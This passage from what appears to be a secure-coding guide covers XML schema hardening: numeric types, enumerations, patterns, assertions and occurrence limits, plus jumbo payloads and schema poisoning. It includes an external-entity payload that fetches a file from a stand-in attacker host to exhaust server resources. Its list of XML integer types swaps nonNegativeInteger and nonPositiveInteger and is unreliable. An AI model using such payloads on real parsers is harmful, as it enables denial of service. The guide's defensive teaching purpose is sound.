<p>The previous schema defines the element <code>CipherValue</code> as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the <code>CipherData</code> element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.</p>
<h3 id="numeric-data-types"><a name="numeric-data-types" class="plugin-anchor" href="#numeric-data-types"><i class="fa fa-link" aria-hidden="true"></i></a>Numeric Data Types</h3>
<p>Defining the correct data type for numbers can be more complex since there are more options than there are for strings.</p>
<h4 id="negative-and-positive-restrictions"><a name="negative-and-positive-restrictions" class="plugin-anchor" href="#negative-and-positive-restrictions"><i class="fa fa-link" aria-hidden="true"></i></a>Negative and Positive Restrictions</h4>
<p>XML Schema numeric data types can include different ranges of numbers. They could include:</p>
<ul>
<li><strong>negativeInteger</strong>: Only negative numbers</li>
<li><strong>nonNegativeInteger</strong>: Negative numbers and the zero value</li>
<li><strong>positiveInteger</strong>: Only positive numbers</li>
<li><strong>nonPositiveInteger</strong>: Positive numbers and the zero value</li>
</ul>
<p>The following sample document defines an <code>id</code> for a product, a <code>price</code>, and a <code>quantity</code> value that is under the control of an attacker:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">buy</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">quantity</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">quantity</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">buy</span>&gt;</span>
</code></pre>
<p>To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:schema</span> <span class="hljs-attr">xmlns:xs</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;buy&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:complexType</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:sequence</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:integer&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;price&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:decimal&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;quantity&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:integer&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;/<span class="hljs-name">xs:sequence</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xs:complexType</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:schema</span>&gt;</span>
</code></pre>
<p>Limiting that <code>quantity</code> to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing <code>price*quantity</code>. However, since this data type may allow negative values, it might allow a negative result on the user&apos;s account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.</p>
<h4 id="divide-by-zero"><a name="divide-by-zero" class="plugin-anchor" href="#divide-by-zero"><i class="fa fa-link" aria-hidden="true"></i></a>Divide by Zero</h4>
<p>Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error <code>FOAR0001</code> will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type <code>positiveInteger</code> for the element.</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;denominator&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:simpleType</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:restriction</span> <span class="hljs-attr">base</span>=<span class="hljs-string">&quot;xs:positiveInteger&quot;</span>/&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:simpleType</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
</code></pre>
<p>The element <code>denominator</code> is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.</p>
<h4 id="special-values-infinity-and-not-a-number-nan"><a name="special-values-infinity-and-not-a-number-nan" class="plugin-anchor" href="#special-values-infinity-and-not-a-number-nan"><i class="fa fa-link" aria-hidden="true"></i></a>Special Values: Infinity and Not a Number (NaN)</h4>
<p>The data types <code>float</code> and <code>double</code> contain real numbers and some special values: <code>-Infinity</code> or <code>-INF</code>, <code>NaN</code>, and <code>+Infinity</code> or <code>INF</code>. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies. Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values <code>Infinity</code> and <code>NaN</code> are not required and only real numbers are expected, the data type <code>decimal</code> is recommended:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:schema</span> <span class="hljs-attr">xmlns:xs</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;buy&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:complexType</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:sequence</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:integer&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;price&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:decimal&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;quantity&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:positiveInteger&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;/<span class="hljs-name">xs:sequence</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xs:complexType</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:schema</span>&gt;</span>
</code></pre>
<p>The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.</p>
<h3 id="general-data-restrictions"><a name="general-data-restrictions" class="plugin-anchor" href="#general-data-restrictions"><i class="fa fa-link" aria-hidden="true"></i></a>General Data Restrictions</h3>
<p>After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:</p>
<h4 id="prefixed-values"><a name="prefixed-values" class="plugin-anchor" href="#prefixed-values"><i class="fa fa-link" aria-hidden="true"></i></a>Prefixed Values</h4>
<p>Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect whitelist scenario for an application: only specific values will be accepted. Such a constraint is called <code>enumeration</code> in XML schema. The following example restricts the contents of the element month to 12 possible values:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;month&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:simpleType</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:restriction</span> <span class="hljs-attr">base</span>=<span class="hljs-string">&quot;xs:string&quot;</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;January&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;February&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;March&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;April&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;May&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;June&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;July&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;August&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;September&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;October&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;November&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:enumeration</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;December&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xs:restriction</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:simpleType</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
</code></pre>
<p>By limiting the month element&apos;s value to any of the previous values, the application will not be manipulating random strings.</p>
<h4 id="ranges"><a name="ranges" class="plugin-anchor" href="#ranges"><i class="fa fa-link" aria-hidden="true"></i></a>Ranges</h4>
<p>Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:simpleType</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:restriction</span> <span class="hljs-attr">base</span>=<span class="hljs-string">&quot;xs:string&quot;</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:minLength</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;3&quot;</span>/&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:maxLength</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;256&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xs:restriction</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:simpleType</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
</code></pre>
<p>In cases where the possible values are restricted to a certain specific length (let&apos;s say 8), this value can be specified as follows to be valid:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:simpleType</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:restriction</span> <span class="hljs-attr">base</span>=<span class="hljs-string">&quot;xs:string&quot;</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:length</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;8&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xs:restriction</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:simpleType</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
</code></pre>
<h4 id="patterns"><a name="patterns" class="plugin-anchor" href="#patterns"><i class="fa fa-link" aria-hidden="true"></i></a>Patterns</h4>
<p>Certain elements or attributes may follow a specific syntax. You can add <code>pattern</code> restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific <code>pattern</code>:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;SSN&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:simpleType</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:restriction</span> <span class="hljs-attr">base</span>=<span class="hljs-string">&quot;xs:token&quot;</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:pattern</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;[0-9]{3}-[0-9]{2}-[0-9]{4}&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xs:restriction</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:simpleType</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
</code></pre>
<p>Only numbers between <code>000-00-0000</code> and <code>999-99-9999</code> will be allowed as values for a SSN.</p>
<h4 id="assertions"><a name="assertions" class="plugin-anchor" href="#assertions"><i class="fa fa-link" aria-hidden="true"></i></a>Assertions</h4>
<p>Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable <code>$value</code> can be used to reference the contents of the value being analyzed. The <em>Divide by Zero</em> section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an <code>assertion</code> disallowing the number zero:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;denominator&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:simpleType</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:restriction</span> <span class="hljs-attr">base</span>=<span class="hljs-string">&quot;xs:integer&quot;</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:assertion</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;$value != 0&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xs:restriction</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:simpleType</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
</code></pre>
<p>The assertion guarantees that the <code>denominator</code> will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.</p>
<h4 id="occurrences"><a name="occurrences" class="plugin-anchor" href="#occurrences"><i class="fa fa-link" aria-hidden="true"></i></a>Occurrences</h4>
<p>The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: <code>minOccurs</code> and <code>maxOccurs</code>. The default value for both the <code>minOccurs</code> and the <code>maxOccurs</code> attributes is <code>1</code>, but certain elements may require other values. For instance, if a value is optional, it could contain a <code>minOccurs</code> of 0, and if there is no limit on the maximum amount, it could contain a <code>maxOccurs</code> of <code>unbounded</code>, as in the following example:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xs:schema</span> <span class="hljs-attr">xmlns:xs</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;operation&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xs:complexType</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">xs:sequence</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;buy&quot;</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">&quot;unbounded&quot;</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">xs:complexType</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">xs:all</span>&gt;</span>
       <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:integer&quot;</span>/&gt;</span>
       <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;price&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:decimal&quot;</span>/&gt;</span>
       <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;quantity&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;xs:integer&quot;</span>/&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">xs:all</span>&gt;</span>
     <span class="hljs-tag">&lt;/<span class="hljs-name">xs:complexType</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xs:complexType</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">xs:element</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xs:schema</span>&gt;</span>
</code></pre>
<p>The previous schema includes a root element named <code>operation</code>, which can contain an unlimited (<code>unbounded</code>) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an <code>unbounded</code> value.</p>
<h2 id="jumbo-payloads"><a name="jumbo-payloads" class="plugin-anchor" href="#jumbo-payloads"><i class="fa fa-link" aria-hidden="true"></i></a>Jumbo Payloads</h2>
<p>Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.</p>
<h3 id="traditional-jumbo-payloads"><a name="traditional-jumbo-payloads" class="plugin-anchor" href="#traditional-jumbo-payloads"><i class="fa fa-link" aria-hidden="true"></i></a>Traditional Jumbo Payloads</h3>
<p>There are two primary methods to make a document larger than normal:</p>
<ul>
<li>Depth attack: using a huge number of elements, element names, and/or element values.</li>
<li>Width attack: using a huge number of attributes, attribute names, and/or attribute values.</li>
</ul>
<p>In most cases, the overall result will be a huge document. This is a short example of what this looks like:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SOAPENV:ENVELOPE</span> <span class="hljs-attr">XMLNS:SOAPENV</span>=<span class="hljs-string">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span> 
                  <span class="hljs-attr">XMLNS:EXT</span>=<span class="hljs-string">&quot;HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">SOAPENV:HEADER</span> <span class="hljs-attr">LARGENAME1</span>=<span class="hljs-string">&quot;LARGEVALUE&quot;</span> 
                 <span class="hljs-attr">LARGENAME2</span>=<span class="hljs-string">&quot;LARGEVALUE2&quot;</span> 
                 <span class="hljs-attr">LARGENAME3</span>=<span class="hljs-string">&quot;LARGEVALUE3&quot;</span> &#x2026;&gt;</span>
 ...
</code></pre>
<h3 id="small-jumbo-payloads"><a name="small-jumbo-payloads" class="plugin-anchor" href="#small-jumbo-payloads"><i class="fa fa-link" aria-hidden="true"></i></a>&quot;Small&quot; Jumbo Payloads</h3>
<p>The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE root [
 &lt;!ENTITY file SYSTEM &quot;http://attacker/huge.xml&quot; &gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;file;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
</code></pre>
<h2 id="schema-poisoning"><a name="schema-poisoning" class="plugin-anchor" href="#schema-poisoning"><i class="fa fa-link" aria-hidden="true"></i></a>Schema Poisoning</h2>
<p>When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.</p>
<h3 id="local-schema-poisoning"><a name="local-schema-poisoning" class="plugin-anchor" href="#local-schema-poisoning"><i class="fa fa-link" aria-hidden="true"></i></a>Local Schema Poisoning</h3>
<p>Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document .</p>
<h4 id="embedded-schema"><a name="embedded-schema" class="plugin-anchor" href="#embedded-schema"><i class="fa fa-link" aria-hidden="true"></i></a>Embedded Schema</h4>
<p>The most trivial type of schema poisoning takes place when the schema is defined within the same XML document. Consider the following, unknowingly vulnerable example provided by the W3C :</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE note [
 &lt;!ELEMENT note (to,from,heading,body)&gt;
 &lt;!ELEMENT to (#PCDATA)&gt;
 &lt;!ELEMENT from (#PCDATA)&gt;
 &lt;!ELEMENT heading (#PCDATA)&gt;
 &lt;!ELEMENT body (#PCDATA)&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&apos;t forget me this weekend<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span>
</code></pre>
<p>All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contains a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.</p>
<h4 id="incorrect-permissions"><a name="incorrect-permissions" class="plugin-anchor" href="#incorrect-permissions"><i class="fa fa-link" aria-hidden="true"></i></a>Incorrect Permissions</h4>
<p>You can often circumvent the risk of using remotely tampered versions by processing a local schema.</p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&apos;t forget me this weekend<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span>
</code></pre>
<p>However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications:</p>
<pre><code class="lang-text">-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
</code></pre>
<p>The permissions set on <code>name.dtd</code> allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.</p>
<h3 id="remote-schema-poisoning"><a name="remote-schema-poisoning" class="plugin-anchor" href="#remote-schema-poisoning"><i class="fa fa-link" aria-hidden="true"></i></a>Remote Schema Poisoning</h3>
<p>Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network&apos;s traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.</p>
<h4 id="man-in-the-middle-mitm-attack"><a name="man-in-the-middle-mitm-attack" class="plugin-anchor" href="#man-in-the-middle-mitm-attack"><i class="fa fa-link" aria-hidden="true"></i></a>Man-in-the-Middle (MitM) Attack</h4>
<p>When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:</p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE note SYSTEM &quot;http://example.com/note.dtd&quot;&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&apos;t forget me this weekend<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span>
</code></pre>
<p>The remote file <code>note.dtd</code> could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .</p>
<h4 id="dns-cache-poisoning"><a name="dns-cache-poisoning" class="plugin-anchor" href="#dns-cache-poisoning"><i class="fa fa-link" aria-hidden="true"></i></a>DNS-Cache Poisoning</h4>
<p>Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses. </p>
<p>The previous example referenced the host <code>example.com</code> using an unencrypted protocol. </p>
<p>When switching to HTTPS, the location of the remote schema will look like <code>https://example/note.dtd</code>. In a normal scenario, the IP of <code>example.com</code> resolves to <code>1.1.1.1</code>:</p>
<pre><code class="lang-bash">$ host example.com
example.com has address 1.1.1.1
</code></pre>
<p>If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker <code>2.2.2.2</code>:</p>
<pre><code class="lang-bash">$ host example.com
example.com has address 2.2.2.2
</code></pre>
